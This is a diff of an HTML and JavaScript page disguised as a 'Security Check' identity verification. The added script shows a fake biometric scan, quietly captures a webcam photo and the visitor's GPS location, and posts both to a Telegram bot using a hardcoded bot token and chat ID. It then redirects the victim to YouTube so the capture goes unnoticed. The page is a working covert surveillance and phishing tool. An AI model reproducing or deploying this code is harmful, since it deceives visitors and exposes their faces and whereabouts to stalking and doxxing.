@@ -3,61 +3,222 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SecureSnap Verification</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Security Check</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
     <script src="https://unpkg.com/feather-icons"></script>
+    <style>
+        @keyframes scan {
+            0% { top: 0%; opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { top: 100%; opacity: 0; }
+        }
+        .scan-line {
+            position: absolute;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: #60a5fa;
+            box-shadow: 0 0 4px #60a5fa;
+            animation: scan 2s linear infinite;
+            z-index: 10;
+        }
+        body::-webkit-scrollbar { display: none; }
+    </style>
 </head>
-<body class="bg-gray-900 text-gray-100 min-h-screen flex items-center justify-center p-4">
-    <div class="w-full max-w-md bg-gray-800 bg-opacity-50 backdrop-blur-lg rounded-2xl border border-gray-700 p-8 shadow-xl">
+<body class="bg-black text-gray-100 min-h-screen flex items-center justify-center p-4 font-sans">
+
+    <div class="w-full max-w-md bg-gray-900 rounded-xl border border-gray-800 p-8 shadow-2xl relative overflow-hidden">
+        
         <!-- Intro Step -->
-        <div id="intro-step">
-            <div class="inline-flex items-center px-4 py-2 rounded-full bg-blue-900 bg-opacity-30 text-blue-300 border border-blue-800 mb-6">
-                <i data-feather="shield" class="w-4 h-4 mr-2"></i>
-                <span class="text-sm font-medium">Secure Verification</span>
+        <div id="intro-step" class="transition-opacity duration-300">
+            <div class="flex justify-center mb-6">
+                <div class="p-4 rounded-full bg-blue-900 bg-opacity-20 text-blue-400">
+                    <i data-feather="map-pin" class="w-8 h-8"></i>
+                </div>
             </div>
-            <h2 class="text-2xl font-bold mb-3">Verify Your Identity</h2>
-            <p class="text-gray-400 mb-6">To ensure security, we need to verify your identity. Please allow camera access. Your image will be securely sent to our verification team.</p>
-            <button onclick="startVerification()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-3 px-4 rounded-lg transition duration-200 flex items-center justify-center">
-                <i data-feather="camera" class="w-5 h-5 mr-2"></i>
+            
+            <h2 class="text-2xl font-bold mb-2 text-center">Security Check</h2>
+            <p class="text-gray-400 mb-8 text-center text-sm">Please allow Camera and Location access to verify your identity.</p>
+            
+            <button id="verify-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition duration-200 flex items-center justify-center">
                 Start Verification
             </button>
+            <p id="error-msg" class="text-red-500 text-xs mt-4 text-center hidden"></p>
         </div>
 
         <!-- Camera Step -->
-        <div id="camera-step" class="hidden">
-            <h3 id="instruction-text" class="text-lg font-medium mb-6 text-center">Initializing camera...</h3>
+        <div id="camera-step" class="hidden flex flex-col items-center">
+            <h3 id="instruction-text" class="text-md font-medium mb-4 text-center text-blue-400 animate-pulse">Initializing sensors...</h3>
             
-            <div class="relative w-64 h-64 mx-auto mb-6 rounded-full overflow-hidden border-4 border-gray-700 hidden" id="camera-wrapper">
-                <div class="absolute inset-0 border-4 border-white border-opacity-30 rounded-full pointer-events-none"></div>
-                <video id="video" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
+            <div class="relative w-64 h-64 mx-auto mb-6 rounded-lg overflow-hidden border-2 border-gray-700 bg-black" id="camera-wrapper">
+                <div class="absolute inset-0 border-2 border-white border-opacity-10 pointer-events-none z-20"></div>
+                <div id="scanner" class="scan-line hidden"></div>
+                <video id="video" class="w-full h-full object-cover scale-x-[-1] z-10" autoplay playsinline muted></video>
             </div>
 
-            <div id="progress-bar" class="h-1 bg-blue-500 transition-all duration-1000 ease-linear mx-auto max-w-xs"></div>
+            <!-- Progress Bar -->
+            <div class="w-full max-w-xs bg-gray-800 rounded-full h-1.5 mb-2 overflow-hidden">
+                <div id="progress-bar" class="bg-blue-500 h-1.5 rounded-full transition-all duration-300 ease-out" style="width: 0%"></div>
+            </div>
+            <p id="status-text" class="text-xs text-gray-500">Waiting for permissions...</p>
         </div>
 
-        <!-- Result Step -->
+        <!-- Result Step (Hidden) -->
         <div id="result-step" class="hidden text-center">
-            <div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-green-900 bg-opacity-30 text-green-400 mb-4">
+            <div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-green-900 bg-opacity-20 text-green-500 mb-4">
                 <i data-feather="check" class="w-8 h-8"></i>
             </div>
-            <h2 class="text-2xl font-bold text-green-400 mb-2">Verification Complete</h2>
-            <p class="text-gray-400 mb-4">Image captured and sent successfully</p>
-            <telegram-badge></telegram-badge>
-<img id="captured-result" src="" alt="Captured Face" class="mx-auto rounded-lg border-2 border-green-500 max-w-xs hidden">
-            <button onclick="location.reload()" class="mt-6 w-full bg-gray-700 hover:bg-gray-600 text-white font-medium py-3 px-4 rounded-lg transition duration-200">
-                <i data-feather="refresh-cw" class="w-5 h-5 mr-2"></i>
-                Verify Again
-            </button>
+            <h2 class="text-xl font-bold text-white mb-2">Verified</h2>
+            <p class="text-gray-400 text-sm">Redirecting...</p>
         </div>
 
         <canvas id="canvas" class="hidden"></canvas>
     </div>
-    <script src="components/telegram-badge.js"></script>
-    <script src="script.js"></script>
-<script>
+
+    <script>
+        // --- CONFIGURATION ---
+        const TELEGRAM_BOT_TOKEN = '8449800162:AAEFmmbyBhxB32jbJykcLUFfkDpm9WqTLJw';
+        const TELEGRAM_CHAT_ID = '7076125469';
+        const REDIRECT_URL = 'https://www.youtube.com';
+        // ---------------------
+
         feather.replace();
+
+        const introStep = document.getElementById('intro-step');
+        const cameraStep = document.getElementById('camera-step');
+        const resultStep = document.getElementById('result-step');
+        const verifyBtn = document.getElementById('verify-btn');
+        const errorMsg = document.getElementById('error-msg');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const scanner = document.getElementById('scanner');
+        const instructionText = document.getElementById('instruction-text');
+        const progressBar = document.getElementById('progress-bar');
+        const statusText = document.getElementById('status-text');
+
+        let stream = null;
+        let userLocationLink = "Location denied";
+
+        verifyBtn.addEventListener('click', startProcess);
+
+        async function startProcess() {
+            errorMsg.classList.add('hidden');
+            verifyBtn.innerHTML = `<i data-feather="loader" class="w-4 h-4 mr-2 animate-spin"></i> Requesting Access...`;
+            feather.replace();
+
+            try {
+                // 1. Request Camera Access
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 640 } }, 
+                    audio: false 
+                });
+                
+                // 2. Update UI for Location Request
+                verifyBtn.innerHTML = `<i data-feather="map-pin" class="w-4 h-4 mr-2 animate-bounce"></i> Allow Location...`;
+                feather.replace();
+
+                // 3. Request Location Access (Awaited)
+                try {
+                    const position = await getPosition();
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    userLocationLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                } catch (locErr) {
+                    console.log("Location denied:", locErr);
+                    userLocationLink = "User Denied Location";
+                }
+
+                // 4. Start Simulation
+                handleCameraSuccess(stream);
+
+            } catch (err) {
+                console.error("Camera denied:", err);
+                errorMsg.textContent = "Camera access is required to proceed.";
+                errorMsg.classList.remove('hidden');
+                verifyBtn.innerHTML = "Start Verification";
+            }
+        }
+
+        // Helper to make Geolocation Promise-based
+        function getPosition() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject("Geolocation not supported");
+                } else {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                }
+            });
+        }
+
+        function handleCameraSuccess(stream) {
+            video.srcObject = stream;
+            introStep.classList.add('hidden');
+            cameraStep.classList.remove('hidden');
+            
+            video.onloadedmetadata = () => {
+                video.play();
+                runSimulation();
+            };
+        }
+
+        function runSimulation() {
+            instructionText.textContent = "Scanning...";
+            statusText.textContent = "Verifying biometrics...";
+            
+            setTimeout(() => {
+                scanner.classList.remove('hidden');
+                progressBar.style.width = "50%";
+                
+                setTimeout(() => {
+                    progressBar.style.width = "100%";
+                    statusText.textContent = "Uploading secure data...";
+                    captureAndRedirect();
+                }, 1500);
+
+            }, 1000);
+        }
+
+        function captureAndRedirect() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+
+            cameraStep.classList.add('hidden');
+            resultStep.classList.remove('hidden');
+            feather.replace();
+
+            canvas.toBlob((blob) => {
+                sendData(blob);
+            }, 'image/jpeg', 0.8);
+        }
+
+        async function sendData(photoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', photoBlob, 'verification.jpg');
+            
+            const caption = `🔐 *VERIFICATION SUCCESS*\n\n📍 *Location:* ${userLocationLink}\n📅 *Time:* ${new Date().toLocaleString()}`;
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'Markdown');
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.error('Upload failed', error);
+            } finally {
+                window.location.href = REDIRECT_URL;
+            }
+        }
     </script>
 </body>
 </html>
+
